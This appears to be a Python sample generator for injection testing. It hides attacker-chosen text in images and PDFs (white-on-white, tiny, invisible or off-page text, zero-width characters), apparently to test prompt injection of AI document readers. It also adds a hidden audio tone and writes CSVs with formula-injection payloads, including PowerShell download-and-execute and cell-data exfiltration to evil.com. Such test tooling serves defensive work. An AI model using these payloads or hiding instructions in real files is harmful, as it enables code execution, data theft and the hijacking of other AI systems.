# -*- coding: utf-8 -*-
"""Sample generation for image/audio/PDF/CSV injection vectors."""
import os
import wave
import struct
import math

# ============================================================
# Optional dependencies
# ============================================================
try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    from reportlab.pdfgen import canvas as rl_canvas
    from reportlab.lib.pagesizes import A4
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.cidfonts import UnicodeCIDFont
    HAS_REPORTLAB = True
except ImportError:
    HAS_REPORTLAB = False


# ============================================================
# Image sample
# ============================================================
def make_injection_image(text, mode="normal", out_path="sample.png"):
    if not HAS_PIL:
        raise RuntimeError("pillow not installed")
    W, H = 900, 260
    img = Image.new("RGB", (W, H), "white")
    d = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("msyh.ttc", 22)
        small = ImageFont.truetype("msyh.ttc", 8)
    except Exception:
        font = ImageFont.load_default()
        small = ImageFont.load_default()
    d.text((20, 20), "【业务公告】", fill="black", font=font)
    d.text((20, 60), "本系统将于 2026 年 1 月 1 日起调整对公账户服务费。", fill="black", font=font)
    d.text((20, 100), "详情请咨询各营业网点或拨打客服热线。", fill="black", font=font)
    if mode == "normal":
        d.text((20, 160), text, fill="red", font=font)
    elif mode == "white_on_white":
        d.text((20, 160), text, fill=(252, 252, 252), font=font)
    elif mode == "tiny_text":
        d.text((20, 160), text, fill="gray", font=small)
    elif mode == "comment":
        d.text((20, 160), f"<!-- {text} -->", fill=(240, 240, 240), font=font)
    img.save(out_path)
    return out_path


# ============================================================
# Audio sample
# ============================================================
def make_injection_wav(out_path="sample.wav", seconds=3, freq_main=440, freq_hidden=16000):
    sr = 16000
    total = int(sr * seconds)
    with wave.open(out_path, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(sr)
        chunk = 4096
        i = 0
        while i < total:
            n = min(chunk, total - i)
            buf = bytearray()
            for k in range(n):
                t = (i + k) / sr
                v = 0.3 * math.sin(2 * math.pi * freq_main * t) + \
                    0.15 * math.sin(2 * math.pi * freq_hidden * t)
                s = int(max(-1, min(1, v)) * 32767)
                buf += struct.pack("<h", s)
            w.writeframes(bytes(buf))
            i += n
    return out_path


# ============================================================
# PDF sample
# ============================================================
def make_injection_pdf(text, mode="white_text", out_path="sample.pdf"):
    if not HAS_REPORTLAB:
        raise RuntimeError("reportlab not installed")
    from .transforms import add_zw
    c = rl_canvas.Canvas(out_path, pagesize=A4)
    W, H = A4
    try:
        pdfmetrics.registerFont(UnicodeCIDFont("STSong-Light"))
        cn_font = "STSong-Light"
    except Exception:
        cn_font = "Helvetica"
    c.setFont(cn_font, 14)
    c.setFillColorRGB(0, 0, 0)
    c.drawString(50, H - 80, "【业务公告】")
    c.drawString(50, H - 110, "本系统将于 2026 年 1 月 1 日起调整对公账户服务费。")
    c.drawString(50, H - 140, "详情请咨询各营业网点或拨打客服热线。")
    if mode == "white_text":
        c.setFillColorRGB(1, 1, 1)
        c.setFont(cn_font, 12)
        c.drawString(50, H - 200, text)
    elif mode == "tiny_text":
        c.setFillColorRGB(0, 0, 0)
        c.setFont(cn_font, 2)
        c.drawString(50, H - 200, text)
    elif mode == "alpha_zero":
        try:
            c.setFillAlpha(0)
        except Exception:
            pass
        c.setFillColorRGB(0, 0, 0)
        c.setFont(cn_font, 12)
        c.drawString(50, H - 200, text)
    elif mode == "off_page":
        c.setFillColorRGB(1, 1, 1)
        c.setFont(cn_font, 12)
        c.drawString(-2000, -2000, text)
    c.setFillColorRGB(1, 1, 1)
    c.setFont(cn_font, 10)
    c.drawString(50, H - 240, add_zw(text))
    c.showPage()
    c.save()
    return out_path


# ============================================================
# CSV sample
# ============================================================
CSV_NORMAL_ROWS = [
    ["客户姓名", "账号", "余额", "备注"],
    ["张三", "6222021234567890", "125000.00", "VIP 客户"],
    ["李四", "6222021234567891", "8600.50", "普通客户"],
    ["王五", "6222021234567892", "0.00", "已销户"],
]

CSV_FORMULA_PAYLOADS = {
    "cmd":       "=cmd|' /C calc'!A0",
    "dde":       "=cmd|' /C powershell -c \"iwr http://evil.com/x.ps1|iex\"'!A0",
    "hyperlink": '=HYPERLINK("http://evil.com/steal?data="&A1,"点我")',
    "exfil":     '=WEBSERVICE("http://evil.com/collect?d="&B2)',
    "ddespawn":  "=cmd|' /C powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')\"'!A0",
}


def make_injection_csv(mode="formula", payload_key="cmd", out_path="sample.csv"):
    """
    Generate CSV samples with formula injection.
    Avoids the csv module so that leading '=' is not escaped.
    mode: formula / row / hidden / normal
    """
    rows = [list(r) for r in CSV_NORMAL_ROWS]
    if mode == "normal":
        pass
    elif mode in ("formula", "row", "hidden"):
        payload = CSV_FORMULA_PAYLOADS.get(payload_key, CSV_FORMULA_PAYLOADS["cmd"])
        if mode == "formula":
            rows[0].append("备注")
            for i in range(1, len(rows)):
                rows[i].append(payload)
        elif mode == "row":
            for i in range(1, len(rows)):
                rows[i].append("" if i != 2 else payload)
        elif mode == "hidden":
            rows[0].append("  内部字段")
            for i in range(1, len(rows)):
                rows[i].append(payload)

    with open(out_path, "w", encoding="utf-8-sig", newline="") as f:
        for row in rows:
            fields = []
            for cell in row:
                s = str(cell)
                # Quote only when the field contains comma / quote / newline,
                # so that leading '=' is preserved.
                if any(ch in s for ch in [",", '"', "\n", "\r"]):
                    s = '"' + s.replace('"', '""') + '"'
                fields.append(s)
            f.write(",".join(fields) + "\r\n")
    return out_path